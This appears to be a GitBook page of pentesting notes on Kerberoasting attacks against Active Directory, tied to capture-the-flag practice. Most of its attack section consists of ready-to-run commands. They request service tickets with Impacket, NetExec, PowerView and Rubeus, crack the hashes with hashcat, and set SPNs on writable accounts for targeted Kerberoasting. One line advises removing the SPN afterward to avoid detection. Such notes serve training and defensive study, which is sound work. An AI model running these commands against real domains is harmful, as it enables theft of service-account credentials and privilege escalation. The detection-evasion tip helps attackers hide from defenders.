---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kerberoasting

## Concept

**Kerberoasting** is an attack on the **Service Ticket (ST)** and **Service Principal Names (SPNs)**. [SPNs](../recon.md#spns) are unique IDs that Kerberos uses to map a service instance, for example MySQL, to a service sign-in account, such as `svc_mysql`, in whose, often privileged, context the service is running. The ST is encrypted with the service's account NTLM hash, so it can potentially be cracked. **Any domain user can request a ST from the DC for any SPN account**.

> _Accounts like `krbtgt`, **computer accounts**, and **(g)MSAs** are usually resistant due to complex, long passwords._

<figure><img src="../../../.gitbook/assets/kerberoasting_process (1).png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

> _Typically,_ [_Kerberoasting_](kerberoasting.md) _happens after compromising a domain user. However, according to_ [_new research_](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)_, it is possible to perform this attack with an account susceptible to ASREPRoast (for an example of this check_ [_Rebound_](../../../boxes/insane/rebound.md#kerberoasting)_)._

## Attack

{% tabs %}
{% tab title="Linux" %}
We can check if an account has an SPN using [PowerView](../../../tools/active-directory/powerview.md).

```bash
# Confirm that the target account has SPN
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

> If time sync errors occur, i.e., `KRB_AP_ERR_SKEW(Clock skew too great)` :
>
> ```bash
> sudo ntpdate 192.168.50.70
> ```

Then we can proceed to Kerberoast the target account with [NetExec](../../../tools/active-directory/netexec.md) or [Impacket](../../../tools/active-directory/impacket.md)'s `GetUserSPNs`.

{% code overflow="wrap" %}
```bash
# Kerberoast the target account with NetExec
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt

# Kerberoast the target account with Impacket's GetUserSPNs
impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN/user -request -outputfile spns.lst

# Kerberoast an account susceptible to ASREPRoasting with Impacket's GetUserSPNs
impacket-GetUserSPNs -no-preauth jjones -usersfile dom_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
```
{% endcode %}

> _For an example of Kerberoasting with NetExec check_ [_here_](https://x7331.gitbook.io/boxes/boxes/boxes/easy/active#eop-via-kerberoasting)_._

Finally, we can crack the hashes using [`hashcat`](../../../tools/passwords/hashcat.md).

{% code overflow="wrap" %}
```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
We can check if an account has an SPN using [PowerView](../../../tools/active-directory/powerview.md) or [Rubeus](../../../tools/active-directory/rubeus.md).

```powershell
# Confirm that the target account has SPN with PowerView
Get-DomainUser 'sqldev' | Select serviceprincipalname
# Enumerate all user-linked SPNs and extract TGS-REP hashes with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Then we can proceed to Kerberoast the target account with [PowerView](../../../tools/active-directory/powerview.md) or [Rubeus](../../../tools/active-directory/rubeus.md).

{% code overflow="wrap" %}
```powershell
# Kerberoast the target account with PowerView
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Kerberoast the target account with Rubeus
.\Rubeus.exe kerberoast /creduser:domain\user1 /credpassword:pass /user:targetUser /outfile:hash.txt /format:hashcat /nowrap

# Kerberoast an account susceptible to ASREPRoasting with Rubeus
.\Rubeus.exe kerberoast /domain:<domain> /dc:<ip> /nopreauth:<user> /spns:<username-list>
```
{% endcode %}

> _For an example of Kerberoasting with Rubeus check_ [_here_](https://x7331.gitbook.io/boxes/boxes/boxes/insane/sizzle#path-to-victory)_._

Finally, we can crack the hashes on our attacking machine using [`hashcat`](../../../tools/passwords/hashcat.md).

{% code overflow="wrap" %}
```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

Optionally, we can clear the SPNs of the target account.

```powershell
# Clear the SPNs of the target account
Set-DomainObject -Identity sqldev -Clear serviceprincipalname
```
{% endtab %}
{% endtabs %}

## Targeted Kerberoasting

If we have `GenericWrite` or `GenericAll` on a user object, we can set an SPN on that user account and then extract and crack the TGS. This attack can be performed with [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast).&#x20;

> _Remember to clean up by removing the SPN afterward to avoid detection!_

```bash
targetedKerberoast.py -v -d <DOMAIN_FQDN> -u <USER> -p <PASSWORD>
```

## Resources

{% tabs %}
{% tab title="Demo" %}
{% embed url="https://www.youtube.com/watch?v=-3MxoxdzFNI" %}
Kerberoasting in 14 minutes!
{% endembed %}
{% endtab %}

{% tab title="GetUserSPNs" %}
{% embed url="https://www.youtube.com/watch?v=xH5T9-m9QXw" %}
How GetUserSPNs script work behind the scenes!
{% endembed %}
{% endtab %}

{% tab title="Lecture" %}
{% embed url="https://www.youtube.com/watch?v=Jaa2LmZaNeU" %}
{% endtab %}

{% tab title="Article" %}
{% embed url="https://adsecurity.org/?p=3458" %}
A great article detailing the Kerberoasting process.
{% endembed %}
{% endtab %}

{% tab title="targetedKerberoast" %}
{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}
{% endtab %}
{% endtabs %}
